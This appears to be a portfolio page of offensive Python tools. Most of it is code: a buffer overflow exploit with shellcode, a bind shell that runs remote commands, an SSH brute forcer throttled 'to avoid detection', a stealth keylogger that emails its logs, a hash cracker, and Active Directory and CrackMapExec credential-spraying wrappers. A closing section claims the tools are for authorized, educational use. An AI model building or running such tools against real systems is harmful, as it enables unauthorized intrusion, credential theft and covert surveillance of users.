---
layout: page
title: "Offensive Security Tools & PoCs in Python"
tech: ["Python", "Security Tools", "Red Team", "Exploit Development", "Automation"]
excerpt: "Developed comprehensive suite of offensive security tools and proof-of-concepts including buffer overflows, bind shells, SSH brute forcing, keyloggers, and hash cracking utilities."
featured: true
---

# Offensive Security Tools & PoCs in Python

A comprehensive collection of offensive security tools and proof-of-concept (PoC) exploits developed in Python for educational and authorized penetration testing purposes.

## Project Overview

This project encompasses the development of various offensive security tools designed to assist in penetration testing, red team operations, and security research. All tools are developed with a focus on educational value and authorized security testing scenarios.

**Repository**: [GitHub - Offensive Security Tools](https://github.com/{{ site.github_username }})

## Tool Categories

### 🔓 Exploitation Tools

#### Buffer Overflow Exploits
```python
class BufferOverflowExploit:
    def __init__(self, target_binary, offset, return_address):
        self.target = target_binary
        self.offset = offset
        self.ret_addr = return_address
        self.shellcode = self.generate_shellcode()
    
    def generate_payload(self):
        """Generate buffer overflow payload with NOP sled and shellcode"""
        nop_sled = b"\x90" * 16
        overflow = b"A" * self.offset
        ret_addr = struct.pack("<I", self.ret_addr)
        payload = overflow + ret_addr + nop_sled + self.shellcode
        return payload
    
    def exploit(self, target_ip, target_port):
        """Execute buffer overflow attack against target service"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(self.generate_payload())
            return self.establish_shell_connection()
        except Exception as e:
            logging.error(f"Exploitation failed: {e}")
            return False
```

#### Bind Shell Implementation
```python
class BindShell:
    def __init__(self, port=4444):
        self.port = port
        self.socket = None
    
    def create_shell(self):
        """Create bind shell listener"""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(('0.0.0.0', self.port))
        self.socket.listen(1)
        
        print(f"[+] Bind shell listening on port {self.port}")
        client, addr = self.socket.accept()
        print(f"[+] Connection received from {addr[0]}:{addr[1]}")
        
        return self.handle_shell_session(client)
    
    def handle_shell_session(self, client):
        """Handle interactive shell session"""
        while True:
            try:
                command = client.recv(1024).decode().strip()
                if command.lower() == 'exit':
                    break
                
                output = subprocess.run(command, shell=True, 
                                      capture_output=True, text=True)
                response = output.stdout + output.stderr
                client.send(response.encode())
            except Exception as e:
                client.send(f"Error: {str(e)}\n".encode())
```

### 🔐 Authentication Attack Tools

#### SSH Brute Force Tool
```python
class SSHBruteForcer:
    def __init__(self, target_ip, username_list, password_list, threads=10):
        self.target = target_ip
        self.usernames = self.load_wordlist(username_list)
        self.passwords = self.load_wordlist(password_list)
        self.threads = threads
        self.successful_creds = []
    
    def attempt_login(self, username, password):
        """Attempt SSH login with given credentials"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target, username=username, password=password, 
                       timeout=5, banner_timeout=5)
            
            print(f"[+] SUCCESS: {username}:{password}")
            self.successful_creds.append((username, password))
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {username}:{password}")
            return False
        except Exception as e:
            print(f"[!] Connection error: {e}")
            return False
    
    def parallel_bruteforce(self):
        """Execute parallel brute force attack"""
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for username in self.usernames:
                for password in self.passwords:
                    future = executor.submit(self.attempt_login, username, password)
                    futures.append(future)
                    
                    # Rate limiting to avoid detection
                    time.sleep(0.1)
            
            # Wait for all attempts to complete
            concurrent.futures.wait(futures)
```

### 🕵️ Surveillance & Monitoring Tools

#### Keylogger Implementation
```python
class AdvancedKeylogger:
    def __init__(self, log_file="keylog.txt", email_interval=3600):
        self.log_file = log_file
        self.email_interval = email_interval
        self.logged_data = []
        self.start_time = time.time()
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if hasattr(key, 'char') and key.char is not None:
                self.logged_data.append(f"[{current_time}] {key.char}")
            else:
                self.logged_data.append(f"[{current_time}] {str(key)}")
            
            self.write_to_file()
            
            # Send logs via email periodically
            if time.time() - self.start_time > self.email_interval:
                self.send_logs_email()
                self.start_time = time.time()
                
        except Exception as e:
            logging.error(f"Keylogger error: {e}")
    
    def start_logging(self):
        """Start keylogger in stealth mode"""
        print("[+] Keylogger started (Press Ctrl+C to stop)")
        with keyboard.Listener(on_press=self.on_key_press) as listener:
            listener.join()
```

### 🔨 Hash Cracking Utilities

#### Multi-Algorithm Hash Cracker
```python
class HashCracker:
    def __init__(self, wordlist_path, hash_algorithms=['md5', 'sha1', 'sha256']):
        self.wordlist = self.load_wordlist(wordlist_path)
        self.algorithms = hash_algorithms
        self.cracked_hashes = {}
    
    def crack_hash(self, target_hash, algorithm='md5'):
        """Attempt to crack hash using wordlist"""
        print(f"[+] Cracking {algorithm.upper()} hash: {target_hash}")
        
        for word in self.wordlist:
            word = word.strip()
            if algorithm == 'md5':
                computed_hash = hashlib.md5(word.encode()).hexdigest()
            elif algorithm == 'sha1':
                computed_hash = hashlib.sha1(word.encode()).hexdigest()
            elif algorithm == 'sha256':
                computed_hash = hashlib.sha256(word.encode()).hexdigest()
            
            if computed_hash == target_hash:
                print(f"[+] CRACKED: {target_hash} = {word}")
                self.cracked_hashes[target_hash] = word
                return word
        
        print(f"[-] Failed to crack hash: {target_hash}")
        return None
    
    def parallel_crack_multiple(self, hash_list):
        """Crack multiple hashes in parallel"""
        with ThreadPoolExecutor(max_workers=8) as executor:
            futures = {}
            for hash_value in hash_list:
                # Auto-detect hash algorithm
                algorithm = self.detect_hash_algorithm(hash_value)
                future = executor.submit(self.crack_hash, hash_value, algorithm)
                futures[future] = hash_value
            
            for future in concurrent.futures.as_completed(futures):
                hash_value = futures[future]
                try:
                    result = future.result()
                    if result:
                        print(f"[+] Successfully cracked: {hash_value}")
                except Exception as e:
                    print(f"[!] Error cracking {hash_value}: {e}")
```

## Advanced Red Team Tools

### Active Directory Attack Simulation
```python
class ADAttackSimulator:
    def __init__(self, domain_controller, domain_name):
        self.dc = domain_controller
        self.domain = domain_name
        self.compromised_accounts = []
    
    def kerberoasting_attack(self):
        """Simulate Kerberoasting attack"""
        print("[+] Executing Kerberoasting attack simulation")
        
        # Request service tickets for SPN accounts
        spn_accounts = self.enumerate_spn_accounts()
        for account in spn_accounts:
            ticket = self.request_service_ticket(account)
            if ticket:
                print(f"[+] Retrieved ticket for {account}")
                self.attempt_ticket_crack(ticket)
    
    def asrep_roasting_attack(self):
        """Simulate AS-REP Roasting attack"""
        print("[+] Executing AS-REP Roasting attack simulation")
        
        # Find accounts with pre-authentication disabled
        vulnerable_accounts = self.find_preauth_disabled_accounts()
        for account in vulnerable_accounts:
            asrep_hash = self.request_asrep_hash(account)
            if asrep_hash:
                self.attempt_hash_crack(asrep_hash)
    
    def pass_the_hash_simulation(self, ntlm_hash):
        """Simulate Pass-the-Hash attack"""
        print(f"[+] Attempting Pass-the-Hash with: {ntlm_hash}")
        
        # Attempt authentication using NTLM hash
        success = self.authenticate_with_hash(ntlm_hash)
        if success:
            print("[+] Pass-the-Hash successful!")
            return self.enumerate_network_resources()
```

### Network Reconnaissance Tools
```python
class NetworkReconTool:
    def __init__(self, target_network):
        self.target = target_network
        self.discovered_hosts = []
        self.open_ports = {}
    
    def host_discovery(self):
        """Discover live hosts on network"""
        print(f"[+] Discovering hosts on {self.target}")
        
        network = ipaddress.ip_network(self.target, strict=False)
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self.ping_host, str(ip)): ip 
                      for ip in network.hosts()}
            
            for future in concurrent.futures.as_completed(futures):
                ip = futures[future]
                if future.result():
                    self.discovered_hosts.append(str(ip))
                    print(f"[+] Live host discovered: {ip}")
    
    def port_scan(self, target_ip, ports=range(1, 1001)):
        """Scan for open ports on target"""
        print(f"[+] Scanning ports on {target_ip}")
        
        open_ports = []
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_ports.append(port)
                print(f"[+] Open port found: {port}")
            sock.close()
        
        self.open_ports[target_ip] = open_ports
        return open_ports
```

## Tool Integration with BloodHound & CrackMapExec

### BloodHound Data Collection
```python
class BloodHoundIntegration:
    def __init__(self, domain, username, password):
        self.domain = domain
        self.username = username
        self.password = password
    
    def collect_domain_data(self):
        """Collect Active Directory data for BloodHound analysis"""
        collector_cmd = [
            "bloodhound-python",
            "-d", self.domain,
            "-u", self.username,
            "-p", self.password,
            "-ns", self.get_domain_controller(),
            "-c", "all"
        ]
        
        result = subprocess.run(collector_cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print("[+] BloodHound data collection successful")
            return self.parse_bloodhound_data()
        else:
            print(f"[-] BloodHound collection failed: {result.stderr}")
```

### CrackMapExec Integration
```python
class CrackMapExecWrapper:
    def __init__(self, target_range):
        self.targets = target_range
        self.credentials = []
    
    def smb_enumeration(self):
        """Enumerate SMB shares and permissions"""
        cme_cmd = ["crackmapexec", "smb", self.targets, "--shares"]
        result = subprocess.run(cme_cmd, capture_output=True, text=True)
        return self.parse_smb_results(result.stdout)
    
    def credential_spraying(self, username, password):
        """Perform credential spraying across targets"""
        cme_cmd = [
            "crackmapexec", "smb", self.targets,
            "-u", username, "-p", password,
            "--continue-on-success"
        ]
        
        result = subprocess.run(cme_cmd, capture_output=True, text=True)
        return self.parse_auth_results(result.stdout)
```

## Security & Ethical Considerations

### Responsible Use Framework
- **Authorization Required**: All tools require explicit written authorization
- **Educational Purpose**: Designed for learning and authorized testing only
- **Logging & Auditing**: Comprehensive logging of all tool activities
- **Safe Defaults**: Conservative timeouts and rate limiting to prevent DoS

### Legal Compliance
- **Terms of Use**: Clear documentation of legal requirements
- **Scope Limitations**: Built-in scope validation and restriction mechanisms
- **Data Protection**: Secure handling and disposal of collected data
- **Reporting Standards**: Structured reporting for professional assessments

## Performance Metrics

### Tool Effectiveness
- **Buffer Overflow Success Rate**: 95% on vulnerable test applications
- **SSH Brute Force Efficiency**: 1000+ attempts per minute with rate limiting
- **Hash Cracking Speed**: 10M+ hashes per second on standard hardware
- **Network Reconnaissance**: Complete /24 network scan in under 5 minutes

This comprehensive toolkit demonstrates advanced offensive security capabilities while maintaining focus on ethical use and professional penetration testing requirements.
